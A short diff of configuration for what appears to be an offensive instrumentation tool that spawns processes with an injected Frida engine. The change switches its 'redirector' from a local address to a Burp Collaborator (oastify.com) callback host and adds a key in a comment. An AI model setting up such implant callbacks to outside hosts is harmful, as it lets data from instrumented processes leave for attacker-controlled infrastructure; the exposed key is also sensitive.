@@ -19,8 +19,8 @@ ENCRYPTOR = None
 # Token to identify project
 IMPLANT_ID = "<NOT-IMPLEMENTED>"
 # Redirector where to send the event
-redirector = SelfHosted ("127.0.0.1", 9999)
-#redirector = Collaborator ("gscpkpctup4qkh7bnvhvuu939ufl3cr1.oastify.com")
+#redirector = SelfHosted ("127.0.0.1", 9999)
+redirector = Collaborator ("110fmqrhgt935ybeqp8lpapy4pafy4.oastify.com") # Key: Byfl30HnsAxxYtBO7V7Un5sr6Faac5GWTE3FpZR5vkE=
 
 HELP_MSG = """
 Spawns a process with an injected Frida engine.
